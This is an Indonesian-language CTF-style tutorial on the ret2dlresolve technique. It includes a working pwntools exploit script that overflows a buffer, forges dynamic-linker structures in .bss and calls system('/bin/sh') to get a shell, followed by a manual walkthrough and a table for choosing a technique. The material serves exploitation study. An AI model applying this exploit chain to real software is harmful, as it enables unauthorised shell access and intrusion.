#cybersecurity

Ret2dlresolve memungkinkan memanggil fungsi libc (misal `system`) **tanpa tahu alamat libc** - kita memanfaatkan dynamic linker untuk me-resolve fungsi saat runtime. Solusi untuk challenge tanpa leak (ASLR aktif, tidak ada output alamat).

## Konsep

Saat program memanggil fungsi libc pertama kali, dynamic linker mencari alamatnya dan mengisi GOT (lazy binding). Ret2dlresolve **memalsukan struktur yang dipakai resolver** sehingga resolver me-resolve fungsi yang kita inginkan (misal system) ke GOT yang kita kendalikan.

## Syarat

- Binary **dynamic** (pakai libc)
- Bisa menulis ke memory writable (`.bss`, stack) - untuk menaruh struktur palsu
- Ada panggilan `read` (untuk menulis payload ke .bss) - atau langsung taruh di payload kalau cukup

## Dengan pwntools (mudah)

```python
from pwn import *

context.binary = elf = ELF("./chall")
io = process("./chall")

offset = 72

rop = ROP(elf)
dlresolve = Ret2dlresolvePayload(elf, symbol="system", args=["/bin/sh"])

# 1. read(0, dlresolve.data_addr, len) - tulis struktur resolve ke .bss
rop.read(0, dlresolve.data_addr, len(dlresolve.payload))
# 2. panggil resolver untuk "system"
rop.ret2dlresolve(dlresolve)

payload = b"A"*offset + rop.chain()
payload += b"\x00" * (len(payload) % 8)   # align
payload += dlresolve.payload              # struktur + "/bin/sh"

io.sendlineafter(b": ", payload)
io.interactive()
```

## Alur manual (untuk paham)

```
1. Tulis ke .bss:
   - string "/bin/sh"
   - struktur reloc palsu (Elf64_Rel) menunjuk ke system
   - nama "system\0"
2. Panggil plt0 (resolver) dengan argumen yang diarahkan ke struktur palsu
3. Resolver mengisi GOT dengan alamat system
4. system("/bin/sh") dijalankan
```

## Catatan

1. `Ret2dlresolvePayload` dari pwntools menghitung semuanya - fokus paham alurnya, bukan hafal byte.
2. `.bss` writable dan alamatnya tetap (tanpa PIE, atau dihitung setelah leak PIE).
3. Kalau `read` tidak ada di PLT, cari fungsi lain yang bisa menulis (scanf, gets).
4. Ret2dlresolve biasanya dipakai saat: no leak + partial RELRO + ada write primitive.
5. Alternatif tanpa leak: SROP (kalau ada syscall), atau brute force alamat (jarang praktis).

## Kapan memilih

| Kondisi | Teknik |
|---|---|
| Ada leak libc | ret2libc (paling mudah) |
| No leak, ada read + resolver | ret2dlresolve |
| No leak, ada syscall | SROP |
| Payload kecil | stack pivot + ret2dlresolve |
